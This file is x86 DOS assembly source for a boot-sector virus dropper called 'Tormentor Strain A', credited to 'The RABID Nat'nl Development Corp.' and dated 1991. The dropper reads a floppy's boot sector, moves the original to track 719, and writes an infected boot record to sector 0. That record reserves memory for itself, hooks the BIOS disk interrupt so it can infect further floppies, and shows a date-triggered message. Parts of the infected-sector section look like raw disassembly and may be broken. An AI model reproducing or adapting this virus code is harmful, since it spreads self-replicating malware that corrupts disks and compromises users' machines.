code_seg segment
	 assume cs:code_seg,ds:code_seg
	
	 org 100h

tormentor 	proc	far

@disp	macro	string			
	mov	dx,offset string
	mov	ah,09h
	int	21h
endm

@exit	macro	
	mov	ax,4c00h
	int	21h
endm

@cls	macro	mode
	mov	ah,00h
	mov	al,mode
	int	10h
endm

start:	jmp	main

boot_area dw 	256 dup (0)
boot_sec  dw	512 dup (0)

message	db	"Tormentor Strain A",13,10
	db	"Written by The High Evolutionary",13,10
	db	"Copyright (C) 1991 by The RABID Nat'nl Development Corp."
	db	13,10,13,10
	db	"Press any key to install onto media in drive A:",13,10
	db	"(Or press CTRL-C to abort)$",13,10

paused	db	13,10,13,10
	db	"[Paused] Insert destination disk if desired and press",13,10
	db	"any key, otherwise, press any key$",13,10

done	db	"Done!$",13,10

r_fail	db	13,10,13,10
	db	"Failed to READ in boot sector$",13,10

w_fail	db	13,10,13,10
	db	"Failed to WRITE boot sector$",13,10

f_infec	db	13,10,13,10
	db	"SHIT! We failed to write the virus code to the disk!!!$",13,10

r_boot	db	13,10,13,10
	db	"Now READING in the boot sector$",13,10

w_boot	db	13,10,13,10
	db	"Now WRITING the boot sector to track 719$",13,10

w_vir	db	13,10,13,10
	db	"Now WRITING the VIRUS to the boot sector$",13,10

succ	db	13,10,13,10
	db	"Success! We installed Tormentor onto the drive$",13,10

memerr	db	13,10,13,10
	db	"BOMB! We had a memory allocation error. Bailing out...$",13,10
	db	13,10

read_shit db	13,10,13,10
	db	"Reading in shit via INT 25...$",13,10
	db	13,10

intro	db	"You are in Torment$",13,10

bootseg	dw	?			; Storage segment address or mem. block
					; containing copy of boot record

dssave	dw	?			; Storage for DS register
;dssave dw	seg	group		; Storage for DS register

pspseg	dw	?			; PSP segment storage

;stack	segment para stack 'STACK'	; Code Segment
;stack 	ends

;_data	segment	word public 'DATA'	; Data Segment
;_data	ends

;dgroup	group	data,stack		; Define segment group

;*****************************************************************************
; Boot record information to infect both floppies and hard-drives
;*****************************************************************************

bootrecord	struc
bootjump	db	3 dup (?)	; Initial 3 byte jmp instruction
oemstring	db	8 dup (?)	; OEM version and DOS
sectorbytes	dw	?		; Bytes per sector
clustersec	db	?		; Sectors per cluster
reservedrec	dw	?		; Reserved sectors
fatcopies	db	?		; number of FAT copies
direntries	dw	?		; number of root dir entries
totalsectors	dw	?		; Total disk sectors
mediadescrip	db	?		; Media Descriptor
fatsectors	dw	?		; number of sectors occupied by 1 FAT
tracksectors	dw	?		; number of sectors per track
heads		dw	?		; number of heads
hiddensectors	dw	?		; number of hidden sectors
bootrecord	ends

drive	db	?			; Current drive pointer

memalloc	proc	near

	push	bp			; Save base pointer
	push 	bx			; Save BX
	mov	bp,sp			; init base pointer
	xor	al,al			; Zero out AL	
	mov	ah,48h			; Allocate mem. function
	int	21h
	jnc	end_memalloc		; exit if no error
	mov	word ptr [bp],bx

end_memalloc:
	pop	bx			; Restore BX
	pop	bp			; Restore Base Pointer
	ret	

memalloc	endp

main:

get_default_drive:
	mov	ah,19h
	int	21h
	mov	byte ptr drive,al	; Move current drive into drive


;	mov	ds,dssave		; Initialise DS
;	mov	ax,es			; get PSP address
;	mov	word ptr pspseg,ax	; and save it...

	jmp	read_boot

;	mov	bx,40h			; Allocate 1024 bytes
;	call	memalloc		; Allocate BX block of memory
;	jnc	read_boot
;	@disp	memerr
;	jmp	quit	

read_boot:
	@disp	read_shit
	mov	ah,08h
	int	21h
	mov	word ptr bootseg,ax
	push	ax			; Save AX onto the stack
	mov	al,0
;	mov	al,byte ptr drive	; Move current drive into AL
	xor 	ah,ah			; Zero out AH
;	pop	ds			; Restore Data_seg
	pushf				; Save flags
	mov	dx,0			; Read in sector 0
	mov	cx,1			; Read in 1 sector
	mov	bx,offset boot_sec	; Store data at DS:boot_sec
	int	25h			; Read in the disk
	popf				; clear flags used by flags
	@disp	done
	mov	ah,08h
	int	21h
;	assume	ds:code_seg		; Restore DS
	
begin:	@cls	03
;	mov	ah,00			; Set screen
;	mov	al,03			; Set screen for 80x25 color
;	int	10h			; Call BIOS
	@disp 	message

	mov	ah,08h			; Wait for a keypress
	int	21h
	mov	cx,3

read_sector:
	@disp	r_boot			; Display that we are reading the
					; sector from the disk
	push	cx			; Counter is pushed onto the stack
	mov	ax,201h			; Read in 1 sector
	mov	bx,offset boot_area	; Store it in boot_area
	mov	cx,1			; Set counter to 1
	mov	dx,0			; Set for drive 0, head 0
	int	13h			; Call BIOS
	pop	cx			; Restore counter
	jnc	good_read		; If there were no errors, then
					; jump to good_read
	loop	read_sector		; Jump back and try reading the sector
					; again while CX>0
	@disp 	r_fail
	mov	ax,4c00h		; Exit
	int	21h			; Call DOS

good_read:
	mov	cx,3			; Set counter to 3
	@disp	paused			; Display message for pause
	mov	ah,08h			; Wait for a key
	int	21h			; Call DOS

;*****************************************************************************
; Write good sector to track 719 (Head 1, track 27, sector 9)
;*****************************************************************************

write_sector:
	@disp	w_boot			; Display that we are writing the 
					; sector to disk
	mov	ax,301h			; Set for writing the boot sector
	mov	bx,offset boot_area	; Set buffer to what we read in
;	mov	bx,offset infected_data
	mov	cx,2709h		; Set counter to 2709h
	mov	dx,100h			; Head 1, drive 0	
	int	13h			; Call BIOS
	pop	cx			; Restore the counter
	jnc	good_write		; If we wrote the sectors allright,
					; then jump to good_write
	loop	write_sector
	@disp	w_fail
	mov	ax,4c00h		; Exit
	int	21h			; Call DOS

good_write:
	mov	cx,3			; Copy 3 into CX
	@disp	w_vir
infect_floppy:
	push	cx			; Push it onto the stack
	mov	ax,301h			; Write 1 sector
	mov	bx,offset infected_data ; Write corrupt boot sector to the
					; drive
	mov	cx,1			; Set counter to 1
	mov	dx,0			; Set for drive A:
	int	13h			; Call BIOS
	jnc	good_infection		; If there are no problems, then
					; continue
	loop	infect_floppy		; Otherwise, try again until CX=0
	@disp	f_infec			; If CX=0, then display the message
					; and then exit
	mov	ax,4c00h		; Exit
	int	21h			; Call DOS

good_infection:
	@disp	succ
	mov	ax,4c00h
	int	21h

;*****************************************************************************
; The following is a copy of the infected boot sector to copy to sector 0
;*****************************************************************************

infected_data	db	0EBh, 34h
		nop
		dec	cx
		inc	dx
		dec	bp
		and	[bx+si],ah
		xor	bp,word ptr ds:[33h]
		add	al,[bp+si]
		add	[bx+si],ax
		add	dh,[bx+si+0]
		rol	byte ptr [bp+si],1	; Rotate
		std				; Set direction flag
		add	al,[bx+si]
		or	[bx+si],ax
		add	al,[bx+si]
		db	19 dup (0)
;		db	'Tormentor Strain A - RABID Nat''nl Development Corp.'
		adc	al,[bx+si]
		add	[bx+si],al
		add	[bx+di],al
		add	dl,bh
		xor	ax,ax			; Zero register
		mov	ds,ax
		mov	ss,ax
		mov	bx,7C00h		; Pointer to boot segment
		mov	sp,bx
		push	ds
data_14		db	53h
		dec	word ptr ds:[413h]
		int	12h			; Put (memory size)/1K in ax
		mov	cl,6
		shl	ax,cl			; Shift w/zeros fill
		mov	es,ax
		xchg	ax,word ptr ds:[4Eh]
		mov	word ptr ds:[7DABh],ax
		mov	ax,128h
		xchg	ax,word ptr ds:[4Ch]
		mov	word ptr ds:[7DA9h],ax
		mov	ax,es
		xchg	ax,word ptr ds:[66h]
		mov	word ptr ds:[7DAFh],ax
		mov	ax,0BBh
		xchg	ax,word ptr ds:[64h]
		mov	word ptr ds:[7DADh],ax
		xor	di,di			; Zero register
		mov	si,bx
		mov	cx,100h
		cld				; Clear direction
		rep	movsw			; Rep when cx >0 Mov [si] to es:[di]
		sti				; Enable interrupts
		push	es
		mov	ax,85h
		push	ax
		retf
		push	bx
		xor	dl,dl			; Zero register
		call	sub_2			; (00FB)
		pop	bx
		push	ds
		pop	es
		mov	ah,2
		mov	dh,1
		call	sub_6			; (011F)
		jc	loc_2			; Jump if carry Set
		push	cs
		pop	ds
		mov	si,offset ds:[0Bh]
		mov	di,offset ds:[7C0Bh]
		mov	cx,2Bh
		cld				; Clear direction
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to es:[di]
		jz	loc_ret_3		; Jump if zero
loc_2:
		pop	bx
		pop	ax
		push	cs
		mov	ax,0AFh
		push	ax
  
loc_ret_3:
		retf				; Return far
read_error:
		push	cs
		pop	ds
		mov	si,1DBh
		call	sub_1			; (00DA)
		xor	ah,ah			; Zero register
		int	16h			; Keyboard i/o  ah=function 00h
						; get keybd char in al, ah=scan
		xor	ax,ax			; Zero register
		int	13h			; Disk  dl=drive a  ah=func 00h
						;  reset disk, al=return status
		push	cs
		pop	es
		mov	bx,offset ds:[200h]
		mov	cx,6
		xor	dx,dx			; Zero register
		mov	ax,201h
		int	13h			; Disk  dl=drive a  ah=func 02h
						;  read sectors to memory es:bx
		jc	read_error		; Jump if carry Set
		mov	cx,0FF0h
		mov	ds,cx
		jmp	dword ptr cs:data_16

;
; Insert Tormentor 	endp here...
;
;tormentor	endp

  
;ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
;			       SUBROUTINE
;ÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜÜ
  
sub_1		proc	near
loc_5:
		mov	bx,7
		cld				; Clear direction
		lodsb				; String [si] to al
		or	al,al			; Zero ?
		jz	loc_ret_9		; Jump if zero
		jns	loc_6			; Jump if not sign
		xor	al,0D7h
		or	bl,88h
loc_6:
		cmp	al,20h			
		jbe	loc_7			; Jump if below or =
		mov	cx,1
		mov	ah,9			; 
		int	10h			; Video display   ah=functn 09h
						; set char al & attrib bl @curs
loc_7:
		mov	ah,0Eh
		int	10h			; Video display   ah=functn 0Eh
						;  write char al, teletype mode
		jmp	short loc_5		; (00DA)
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_2:
		mov	bx,200h
		mov	cx,2
		mov	ah,cl
		call	sub_5			; (011D)
		mov	cx,2709h
		xor	byte ptr es:[bx],0FDh
		jz	loc_8			; Jump if zero
		mov	cx,4F0Fh
loc_8:
		jmp	short loc_ret_9		; (0127)
		nop
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_3:
		mov	ah,2
		mov	bx,200h
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_4:
		mov	cx,1
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_5:
		mov	dh,0
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_6:
		mov	al,1
  
;ßßßß External Entry into Subroutine ßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßßß
  
sub_7:
		pushf				; Push flags
		call	dword ptr cs:data_15
  
loc_ret_9:
		retn
sub_1		endp
  
		push	ax
		push	bx
		push	cx
		push	dx
		push	es
		push	ds
		push	si
		push	di
		pushf				; Push flags
		push	cs
		pop	ds
		cmp	dl,1
		ja	loc_11			; Jump if above
		and	ax,0FE00h
		jz	loc_11			; Jump if zero
		xchg	al,ch
		shl	al,1			; Shift w/zeros fill
		add	al,dh
		mov	ah,9
		mul	ah			; ax = reg * al
		add	ax,cx
		sub	al,6
		cmp	ax,6
		ja	loc_11			; Jump if above
		push	cs
		pop	es
		call	sub_3			; (0115)
		jc	loc_10			; Jump if carry Set
		mov	di,offset data_14
		mov	si,offset ds:[243h]
		mov	cx,0Eh
		std				; Set direction flag
		repe	cmpsb			; Rep zf=1+cx >0 Cmp [si] to
						; es:[di]
		jz	loc_11			; Jump if zero
		sub	si,cx
		sub	di,cx
		mov	cl,33h			; '3'
		rep	movsb			; Rep when cx >0 Mov [si] to
						; es:[di]
		call	sub_2			; (00FB)
		push	cx
		push	bx
		call	sub_3			; (0115)
		mov	ah,3
		xor	bx,bx			; Zero register
		call	sub_4			; (011A)
		pop	bx
		pop	cx
		jc	loc_10			; Jump if carry Set
		mov	dh,1
		mov	ah,3
		call	sub_6			; (011F)
loc_10:
		xor	ax,ax			; Zero register
		call	sub_7			; (0121)
loc_11:
		mov	ah,4
		int	1Ah			; Real time clock   ah=func 04h
						; read date cx=year, dx=mon/day
		cmp	dh,9
		jne	not_month		; Jump if not equal
		mov	si,1B1h
		call	sub_1			; (00DA)
not_month:
		popf				; Pop flags
		pop	di
		pop	si
		pop	ds
		pop	es
		pop	dx
		pop	cx
		pop	bx
		pop	ax
		jmp	dword ptr cs:data_15
data_15		dd	0C602EC59h
data_16		dd	0F000E6F2h
		esc	2,ch			; coprocessor escape
		and	[bp+di-4141h],al
		movsb				; Mov [si] to es:[di]
		idiv	word ptr [bp-85Ch]	; ax,dxrem=dx:ax/data
		xchg	ax,si
		mov	si,offset ds:[0B4A5h]
		mov	ax,0DAA7h
		esc	5,[bx+si]		; coprocessor escape
		db	'IO      SYSMSDOS   SYS', 0Dh, 0Ah
		db	'Non-system disk or disk error', 0Dh
		db	0Ah
		add	[bx+si],al
		push	bp
;		jmp	cont

;		db	'Tormentor Strain A - RABID Nat''nl Development Corp.'
		stosb
;cont:		stosb				; Store al to es:[di]
  
tormentor	endp

quit:	mov	ax,4c00h
	int	21h
 
	
	code_seg	ends
end 	start

